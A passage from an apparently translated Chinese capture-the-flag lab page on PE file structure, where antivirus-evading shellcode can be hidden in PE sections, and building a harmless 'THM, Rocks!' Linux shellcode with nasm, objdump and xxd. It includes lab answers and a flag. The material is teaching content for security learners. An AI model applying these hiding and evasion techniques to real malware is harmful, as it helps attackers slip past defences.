\u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u5904\u7406\u7684\u662f\u6253\u5305\u548c\u89e3\u5305\u4e3b\u9898\uff0c\u8be5\u6280\u672f\u9700\u8981\u6709\u5173PE\u7ed3\u6784\u7684\u8be6\u7ec6\u4fe1\u606f\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u53e6\u4e00\u4e2a\u539f\u56e0\u662fAV\u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u5206\u6790\u5e08\u6839\u636ePE\u5934\u548c\u5176\u4ed6PE\u90e8\u5206\u4e2d\u7684\u4fe1\u606f\u5206\u6790EXE\u6587\u4ef6\u3002 \u56e0\u6b64\uff0c\u8981\u521b\u5efa\u6216\u4fee\u6539\u5177\u6709\u9488\u5bf9Windows\u673a\u5668\u7684AV\u89c4\u907f\u80fd\u529b\u7684\u6076\u610f\u8f6f\u4ef6\uff0c\u6211\u4eec\u9700\u8981\u4e86\u89e3Windows\u53ef\u79fb\u690d\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7ed3\u6784\u4ee5\u53ca\u6076\u610fshellcode\u53ef\u4ee5\u5b58\u50a8\u7684\u4f4d\u7f6e\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4f55\u5b9a\u4e49\u548c\u521d\u59cb\u5316shellcode\u53d8\u91cf\u6765\u63a7\u5236\u5c06shellcode\u5b58\u50a8\u5728\u54ea\u4e2a\u6570\u636e\u90e8\u5206\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e9b\u793a\u4f8b\uff0c\u5c55\u793a\u6211\u4eec\u5982\u4f55\u5728PE\u4e2d\u5b58\u50a8shellcode\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u5c06shellcode\u5b9a\u4e49\u4e3a\u4e3b\u51fd\u6570\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u5c06\u5c06\u5176\u5b58\u50a8\u5728** .TEXT ** PE\u90e8\u5206\u4e2d\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5c06shellcode\u5b9a\u4e49\u4e3a\u5168\u5c40\u53d8\u91cf\u5c06\u5c06\u5176\u5b58\u50a8\u5728** .Data **\u90e8\u5206\u4e2d\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u53e6\u4e00\u79cd\u6280\u672f\u6d89\u53ca\u5c06shellcode\u4f5c\u4e3a\u539f\u59cb\u4e8c\u8fdb\u5236\u5b58\u50a8\u5728\u56fe\u6807\u56fe\u50cf\u4e2d\uff0c\u5e76\u5728\u4ee3\u7801\u4e2d\u94fe\u63a5\u5b83\uff0c\u56e0\u6b64\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4f1a\u51fa\u73b0\u5728** .rsrc **\u6570\u636e\u90e8\u5206\u4e2d\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6211\u4eec\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5b9a\u4e49\u6570\u636e\u90e8\u5206\u6765\u5b58\u50a8shellcode\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.h3,{id:"pe-bear",children:"PE-Bear"}),"\n",(0,d.jsxs)(n.p,{children:["\u9644\u52a0\u7684VM\u662f\u4e00\u4e2aWindows\u5f00\u53d1\u673a\u5668\uff0c\u5177\u6709\u89e3\u6790EXE\u6587\u4ef6\u548c\u8bfb\u53d6\u6211\u4eec\u8ba8\u8bba\u7684\u8be6\u7ec6\u4fe1\u606f\u6240\u9700\u7684\u5de5\u5177\u3002 \u4e3a\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u4eec\u5728\u684c\u9762\u4e0a\u63d0\u4f9b\u4e86PE-Bear\u8f6f\u4ef6\u7684\u526f\u672c\uff0c\u5b83\u6709\u52a9\u4e8e\u68c0\u67e5PE\u7ed3\u6784\uff1a\u5934\u3001\u90e8\u5206\u7b49\u3002 PE-Bear\u63d0\u4f9b\u4e86\u4e00\u4e2a\u56fe\u5f62\u7528\u6237\u754c\u9762\u6765\u663e\u793a\u6240\u6709\u76f8\u5173\u7684EXE\u8be6\u7ec6\u4fe1\u606f\u3002 \u8981\u52a0\u8f7dEXE\u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u8bf7\u9009\u62e9",(0,d.jsx)(n.strong,{children:"File"})," -> ",(0,d.jsx)(n.strong,{children:"Load PEs"})," (Ctrl + O)\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"PE-Bear: \u4e3b\u7a97\u53e3",src:s(3267).A+"",width:"607",height:"446"})}),"\n",(0,d.jsx)(n.p,{children:"\u4e00\u65e6\u6587\u4ef6\u88ab\u52a0\u8f7d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6240\u6709PE\u8be6\u7ec6\u4fe1\u606f\u3002 \u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u52a0\u8f7d\u6587\u4ef6\u7684PE\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6211\u4eec\u5728\u672c\u4efb\u52a1\u524d\u9762\u8ba8\u8bba\u7684\u5934\u548c\u90e8\u5206\u3002"}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"PE-Bear: \u52a0\u8f7d\u6587\u4ef6",src:s(9720).A+"",width:"809",height:"466"})}),"\n",(0,d.jsxs)(n.p,{children:["\u73b0\u5728\u662f\u65f6\u5019\u5c1d\u8bd5\u4e00\u4e0b\u4e86\uff01 \u52a0\u8f7d",(0,d.jsx)(n.strong,{children:"thm-intro2PE.exe"}),"\u6587\u4ef6\u4ee5\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\u3002 \u8be5\u6587\u4ef6\u4f4d\u4e8e\u4ee5\u4e0b\u4f4d\u7f6e\uff1a",(0,d.jsx)(n.code,{children:"c:\\Tools\\PE files\\thm-intro2PE.exe"}),"\u3002"]}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" thm-intro2PE.exe\u6587\u4ef6\u7684MD5\u54c8\u5e0c\u503c\u7684\u6700\u540e6\u4f4d\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"530949\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" thm-intro2PE.exe\u6587\u4ef6\u7684\u5e7b\u6570\u503c\u662f\u591a\u5c11\uff08\u5341\u516d\u8fdb\u5236\uff09\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"5A4D\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" thm-intro2PE.exe\u6587\u4ef6\u7684\u5165\u53e3\u70b9\u503c\u662f\u591a\u5c11\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"12E4\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" thm-intro2PE.exe\u6587\u4ef6\u6709\u591a\u5c11\u4e2a\u90e8\u5206\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"7\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u90e8\u5206\u6765\u5b58\u50a8\u989d\u5916\u6570\u636e\u3002 \u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u8005\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5176\u6076\u610f\u4ee3\u7801\u7684\u65b0\u90e8\u5206\uff0c\u5e76\u52ab\u6301\u7a0b\u5e8f\u7684\u6d41\u7a0b\u4ee5\u8df3\u8f6c\u5e76\u6267\u884c\u65b0\u90e8\u5206\u7684\u5185\u5bb9\u3002 \u989d\u5916\u90e8\u5206\u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:".flag\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u68c0\u67e5\u989d\u5916\u90e8\u5206\u7684\u5185\u5bb9\u3002 \u6807\u5fd7\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"THM{PE-N3w-s3ction!}\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a14-shellcode\u7b80\u4ecb",children:"\u4efb\u52a14 Shellcode\u7b80\u4ecb"}),"\n",(0,d.jsx)(n.p,{children:"Shellcode\u662f\u4e00\u7ec4\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u673a\u5668\u4ee3\u7801\u6307\u4ee4\uff0c\u544a\u8bc9\u6613\u53d7\u653b\u51fb\u7684\u7a0b\u5e8f\u8fd0\u884c\u9644\u52a0\u529f\u80fd\uff0c\u5e76\u4e14\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u63d0\u4f9b\u5bf9\u7cfb\u7edfshell\u7684\u8bbf\u95ee\u6216\u521b\u5efa\u53cd\u5411\u547d\u4ee4shell\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u4e00\u65e6shellcode\u88ab\u6ce8\u5165\u5230\u8fdb\u7a0b\u4e2d\u5e76\u7531\u6613\u53d7\u653b\u51fb\u7684\u8f6f\u4ef6\u6216\u7a0b\u5e8f\u6267\u884c\uff0c\u5b83\u4f1a\u4fee\u6539\u4ee3\u7801\u8fd0\u884c\u6d41\u7a0b\u4ee5\u66f4\u65b0\u7a0b\u5e8f\u7684\u5bc4\u5b58\u5668\u548c\u529f\u80fd\u6765\u6267\u884c\u653b\u51fb\u8005\u7684\u4ee3\u7801\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u5b83\u901a\u5e38\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\uff0c\u5e76\u7ffb\u8bd1\u6210\u5341\u516d\u8fdb\u5236\u64cd\u4f5c\u7801\u3002 \u7f16\u5199\u72ec\u7279\u548c\u81ea\u5b9a\u4e49\u7684shellcode\u6709\u52a9\u4e8e\u663e\u8457\u89c4\u907fAV\u8f6f\u4ef6\u3002 \u4f46\u7f16\u5199\u81ea\u5b9a\u4e49shellcode\u9700\u8981\u5904\u7406\u6c47\u7f16\u8bed\u8a00\u7684\u4f18\u79c0\u77e5\u8bc6\u548c\u6280\u80fd\uff0c\u8fd9\u4e0d\u662f\u4e00\u9879\u5bb9\u6613\u7684\u4efb\u52a1\uff01"}),"\n",(0,d.jsx)(n.h3,{id:"\u4e00\u4e2a\u7b80\u5355\u7684shellcode",children:"\u4e00\u4e2a\u7b80\u5355\u7684Shellcode"}),"\n",(0,d.jsx)(n.p,{children:"\u4e3a\u4e86\u5236\u4f5c\u4f60\u81ea\u5df1\u7684shellcode\uff0c\u9700\u8981\u4e00\u5957\u6280\u80fd\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u5bf9x86\u548cx64 CPU\u67b6\u6784\u7684\u9002\u5f53\u7406\u89e3\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6c47\u7f16\u8bed\u8a00\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5bf9\u7f16\u7a0b\u8bed\u8a00\uff08\u5982C\uff09\u7684\u624e\u5b9e\u77e5\u8bc6\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u719f\u6089Linux\u548cWindows\u64cd\u4f5c\u7cfb\u7edf\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:'\u4e3a\u4e86\u751f\u6210\u6211\u4eec\u81ea\u5df1\u7684shellcode\uff0c\u6211\u4eec\u9700\u8981\u4ece\u6c47\u7f16\u5668\u673a\u5668\u4ee3\u7801\u4e2d\u7f16\u5199\u548c\u63d0\u53d6\u5b57\u8282\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u4efb\u52a1\uff0c\u6211\u4eec\u5c06\u4f7f\u7528AttackBox\u4e3aLinux\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684shellcode\uff0c\u5199\u5165\u5b57\u7b26\u4e32"THM, Rocks!"\u3002 \u4ee5\u4e0b\u6c47\u7f16\u4ee3\u7801\u4f7f\u7528\u4e24\u4e2a\u4e3b\u8981\u51fd\u6570\uff1a'}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u7cfb\u7edf\u5199\u5165\u51fd\u6570\uff08sys_write\uff09\u6765\u6253\u5370\u6211\u4eec\u9009\u62e9\u7684\u5b57\u7b26\u4e32\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u7cfb\u7edf\u9000\u51fa\u51fd\u6570\uff08sys_exit\uff09\u6765\u7ec8\u6b62\u7a0b\u5e8f\u7684\u6267\u884c\u3002"}),"\n"]}),"\n",(0,d.jsxs)(n.p,{children:["\u4e3a\u4e86\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\uff0c\u6211\u4eec\u5c06\u4f7f\u7528",(0,d.jsx)(n.strong,{children:"\u7cfb\u7edf\u8c03\u7528"}),"\u3002 \u7cfb\u7edf\u8c03\u7528\u662f\u7a0b\u5e8f\u8bf7\u6c42\u5185\u6838\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\u7684\u65b9\u5f0f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c06\u8bf7\u6c42\u5185\u6838\u5c06\u5b57\u7b26\u4e32\u5199\u5165\u6211\u4eec\u7684\u5c4f\u5e55\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002 \u6bcf\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u90fd\u6709\u4e0d\u540c\u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u8fd9\u610f\u5473\u7740\u8981\u5728Linux\u4e2d\u4f7f\u7528\u5199\u5165\uff0c\u60a8\u53ef\u80fd\u4f7f\u7528\u4e0e\u5728Windows\u4e0a\u4f7f\u7528\u7684\u4e0d\u540c\u7684\u7cfb\u7edf\u8c03\u7528\u3002 \u5bf9\u4e8e64\u4f4dLinux\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u4ee5\u4e0b\u503c\u4ece\u5185\u6838\u8c03\u7528\u6240\u9700\u7684\u51fd\u6570\uff1a"]}),"\n",(0,d.jsxs)(n.table,{children:[(0,d.jsx)(n.thead,{children:(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"rax"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"System Call"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"rdi"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"rsi"}),(0,d.jsx)(n.th,{style:{textAlign:"left"},children:"rdx"})]})}),(0,d.jsxs)(n.tbody,{children:[(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"0x1"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"sys_write"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"unsigned int fd"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"const char *buf"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"size_t count"})]}),(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"0x3c"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"sys_exit"}),(0,d.jsx)(n.td,{style:{textAlign:"left"},children:"int error_code"}),(0,d.jsx)(n.td,{style:{textAlign:"left"}}),(0,d.jsx)(n.td,{style:{textAlign:"left"}})]})]})]}),"\n",(0,d.jsx)(n.p,{children:"\u4e0a\u8868\u544a\u8bc9\u6211\u4eec\u9700\u8981\u5728\u4e0d\u540c\u7684\u5904\u7406\u5668\u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u54ea\u4e9b\u503c\uff0c\u4ee5\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u8c03\u7528sys_write\u548csys_exit\u51fd\u6570\u3002 \u5bf9\u4e8e64\u4f4dLinux\uff0crax\u5bc4\u5b58\u5668\u7528\u4e8e\u6307\u793a\u6211\u4eec\u5e0c\u671b\u5728\u5185\u6838\u4e2d\u8c03\u7528\u7684\u51fd\u6570\u3002 \u5c06rax\u8bbe\u7f6e\u4e3a0x1\u4f7f\u5185\u6838\u6267\u884csys_write\uff0c\u5c06rax\u8bbe\u7f6e\u4e3a0x3c\u5c06\u4f7f\u5185\u6838\u6267\u884csys_exit\u3002 \u8fd9\u4e24\u4e2a\u51fd\u6570\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u9700\u8981\u4e00\u4e9b\u53c2\u6570\u624d\u80fd\u5de5\u4f5c\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u901a\u8fc7rdi\u3001rsi\u548crdx\u5bc4\u5b58\u5668\u8bbe\u7f6e\u3002 \u60a8\u53ef\u4ee5\u5728\u6b64\u5904\u627e\u5230\u53ef\u7528\u768464\u4f4dLinux\u7cfb\u7edf\u8c03\u7528\u7684\u5b8c\u6574\u53c2\u8003\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u5bf9\u4e8e",(0,d.jsx)(n.strong,{children:"sys_write"}),"\uff0c\u901a\u8fc7",(0,d.jsx)(n.strong,{children:"rdi"}),"\u53d1\u9001\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002 ",(0,d.jsx)(n.strong,{children:"rsi"}),"\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6307\u5411\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff0c\u800c",(0,d.jsx)(n.strong,{children:"rdx"}),"\u4e2d\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u5927\u5c0f\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u5bf9\u4e8e",(0,d.jsx)(n.strong,{children:"sys_exit"}),"\uff0c\u9700\u8981\u5c06rdi\u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u7684\u9000\u51fa\u4ee3\u7801\u3002 \u6211\u4eec\u5c06\u4f7f\u7528\u4ee3\u78010\uff0c\u8fd9\u610f\u5473\u7740\u7a0b\u5e8f\u6210\u529f\u9000\u51fa\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u5c06\u4ee5\u4e0b\u4ee3\u7801\u590d\u5236\u5230\u60a8\u7684AttackBox\u4e2d\uff0c\u4fdd\u5b58\u4e3a\u540d\u4e3a",(0,d.jsx)(n.strong,{children:"thm.asm"}),"\u7684\u6587\u4ef6\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-asm",children:'global _start\n\nsection .text\n_start:\n    jmp MESSAGE      ; 1) let\'s jump to MESSAGE\n\nGOBACK:\n    mov rax, 0x1\n    mov rdi, 0x1\n    pop rsi          ; 3) we are popping into `rsi`; now we have the\n                     ; address of "THM, Rocks!\\r\\n"\n    mov rdx, 0xd\n    syscall\n\n    mov rax, 0x3c\n    mov rdi, 0x0\n    syscall\n\nMESSAGE:\n    call GOBACK       ; 2) we are going back, since we used `call`, that means\n                      ; the return address, which is, in this case, the address\n                      ; of "THM, Rocks!\\r\\n", is pushed into the stack.\n    db "THM, Rocks!", 0dh, 0ah\n'})}),"\n",(0,d.jsxs)(n.p,{children:["\u8ba9\u6211\u4eec\u518d\u89e3\u91ca\u4e00\u4e0bASM\u4ee3\u7801\u3002 \u9996\u5148\uff0c\u6211\u4eec\u7684\u6d88\u606f\u5b57\u7b26\u4e32\u5b58\u50a8\u5728.text\u8282\u7684\u672b\u5c3e\u3002 \u7531\u4e8e\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u6307\u5411\u8be5\u6d88\u606f\u7684\u6307\u9488\u6765\u6253\u5370\u5b83\uff0c\u6211\u4eec\u5c06\u5728\u6d88\u606f\u672c\u8eab\u4e4b\u524d\u8df3\u8f6c\u5230call\u6307\u4ee4\u3002 \u5f53\u6267\u884c",(0,d.jsx)(n.strong,{children:"call GOBACK"}),"\u65f6\uff0ccall\u4e4b\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5c06\u88ab\u538b\u5165\u5806\u6808\uff0c\u8fd9\u5bf9\u5e94\u4e8e\u6211\u4eec\u6d88\u606f\u7684\u4f4d\u7f6e\u3002 \u8bf7\u6ce8\u610f\uff0c\u6d88\u606f\u672b\u5c3e\u76840dh\u30010ah\u662f\u6362\u884c\u7b26\uff08\\r\\n\uff09\u7684\u4e8c\u8fdb\u5236\u7b49\u6548\u5f62\u5f0f\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u7a0b\u5e8f\u542f\u52a8GOBACK\u4f8b\u7a0b\uff0c\u5e76\u4e3a\u6211\u4eec\u7684\u7b2c\u4e00\u4e2asys_write()\u51fd\u6570\u51c6\u5907\u6240\u9700\u7684\u5bc4\u5b58\u5668\u3002"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u6211\u4eec\u901a\u8fc7\u5728rax\u5bc4\u5b58\u5668\u4e2d\u5b58\u50a81\u6765\u6307\u5b9asys_write\u51fd\u6570\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6211\u4eec\u5c06rdi\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u5c06\u5b57\u7b26\u4e32\u6253\u5370\u5230\u7528\u6237\u63a7\u5236\u53f0\uff08STDOUT\uff09\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u6211\u4eec\u5f39\u51fa\u4e00\u4e2a\u6307\u5411\u6211\u4eec\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff0c\u8be5\u6307\u9488\u5728\u6211\u4eec\u8c03\u7528GOBACK\u65f6\u88ab\u538b\u5165\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230rsi\u4e2d\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u901a\u8fc7syscall\u6307\u4ee4\uff0c\u6211\u4eec\u4f7f\u7528\u6211\u4eec\u51c6\u5907\u7684\u503c\u6267\u884csys_write\u51fd\u6570\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5bf9\u4e8e\u4e0b\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u6267\u884c\u76f8\u540c\u7684\u64cd\u4f5c\u6765\u8c03\u7528sys_exit\u51fd\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u5c060x3c\u8bbe\u7f6e\u5230rax\u5bc4\u5b58\u5668\u4e2d\uff0c\u5e76\u8c03\u7528syscall\u51fd\u6570\u6765\u9000\u51fa\u7a0b\u5e8f\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u7f16\u8bd1\u5e76\u94fe\u63a5ASM\u4ee3\u7801\u4ee5\u521b\u5efax64 Linux\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u6700\u7ec8\u6267\u884c\u8be5\u7a0b\u5e8f\u3002"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Assembler and link our code"',children:"user@AttackBox$ nasm -f elf64 thm.asm\nuser@AttackBox$ ld thm.o -o thm\nuser@AttackBox$ ./thm\nTHM,Rocks!\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u6211\u4eec\u4f7f\u7528",(0,d.jsx)(n.strong,{children:"nasm"}),"\u547d\u4ee4\u7f16\u8bd1asm\u6587\u4ef6\uff0c\u6307\u5b9a**-f elf64**\u9009\u9879\u4ee5\u6307\u793a\u6211\u4eec\u6b63\u5728\u4e3a64\u4f4dLinux\u7f16\u8bd1\u3002 \u8bf7\u6ce8\u610f\uff0c\u7ed3\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a.o\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u76ee\u6807\u4ee3\u7801\uff0c\u9700\u8981\u94fe\u63a5\u624d\u80fd\u6210\u4e3a\u53ef\u5de5\u4f5c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002 ",(0,d.jsx)(n.strong,{children:"ld"}),"\u547d\u4ee4\u7528\u4e8e\u94fe\u63a5\u76ee\u6807\u6587\u4ef6\u5e76\u83b7\u53d6\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002 ",(0,d.jsx)(n.strong,{children:"-o"}),"\u9009\u9879\u7528\u4e8e\u6307\u5b9a\u8f93\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540d\u79f0\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u6709\u4e86\u7f16\u8bd1\u540e\u7684ASM\u7a0b\u5e8f\uff0c\u8ba9\u6211\u4eec\u4f7f\u7528",(0,d.jsx)(n.strong,{children:"objdump"}),"\u547d\u4ee4\u901a\u8fc7\u8f6c\u50a8\u7f16\u8bd1\u540e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684.text\u8282\u6765\u63d0\u53d6shellcode\u3002"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Dump the .text section"',children:"user@AttackBox$ objdump -d thm\n\nthm:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000400080 <_start>:\n  400080:    eb 1e                    jmp    4000a0 \n\n0000000000400082 :\n  400082:    b8 01 00 00 00           mov    $0x1,%eax\n  400087:    bf 01 00 00 00           mov    $0x1,%edi\n  40008c:    5e                       pop    %rsi\n  40008d:    ba 0d 00 00 00           mov    $0xd,%edx\n  400092:    0f 05                    syscall \n  400094:    b8 3c 00 00 00           mov    $0x3c,%eax\n  400099:    bf 00 00 00 00           mov    $0x0,%edi\n  40009e:    0f 05                    syscall \n\n00000000004000a0 :\n  4000a0:    e8 dd ff ff ff           callq  400082 \n  4000a5:    54                       push   %rsp\n  4000a6:    48                       rex.W\n  4000a7:    4d 2c 20                 rex.WRB sub $0x20,%al\n  4000aa:    52                       push   %rdx\n  4000ab:    6f                       outsl  %ds:(%rsi),(%dx)\n  4000ac:    63 6b 73                 movslq 0x73(%rbx),%ebp\n  4000af:    21                       .byte 0x21\n  4000b0:    0d                       .byte 0xd\n  4000b1:    0a                       .byte 0xa\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u9700\u8981\u4ece\u4e0a\u8ff0\u8f93\u51fa\u4e2d\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c\u3002 \u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528",(0,d.jsx)(n.strong,{children:"objcopy"}),"\u5c06**.text",(0,d.jsx)(n.strong,{children:"\u8282\u8f6c\u50a8\u5230\u4e00\u4e2a\u540d\u4e3a"}),"thm.text**\u7684\u65b0\u6587\u4ef6\u4e2d\uff0c\u683c\u5f0f\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5982\u4e0b\u6240\u793a\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",children:"user@AttackBox$ objcopy -j .text -O binary thm thm.text\n"})}),"\n",(0,d.jsxs)(n.p,{children:["thm.text\u5305\u542b\u6211\u4eec\u7684shellcode\uff0c\u683c\u5f0f\u4e3a\u4e8c\u8fdb\u5236\uff0c\u56e0\u6b64\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u5b83\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u5176\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u3002 ",(0,d.jsx)(n.strong,{children:"xxd"}),"\u547d\u4ee4\u5177\u6709**-i**\u9009\u9879\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ee5C\u5b57\u7b26\u4e32\u5f62\u5f0f\u8f93\u51fa\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Output the hex equivalent to our shellcode"',children:"user@AttackBox$ xxd -i thm.text\nunsigned char new_text[] = {\n  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,\n  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,\n  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,\n  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,\n  0x0d, 0x0a\n};\nunsigned int new_text_len = 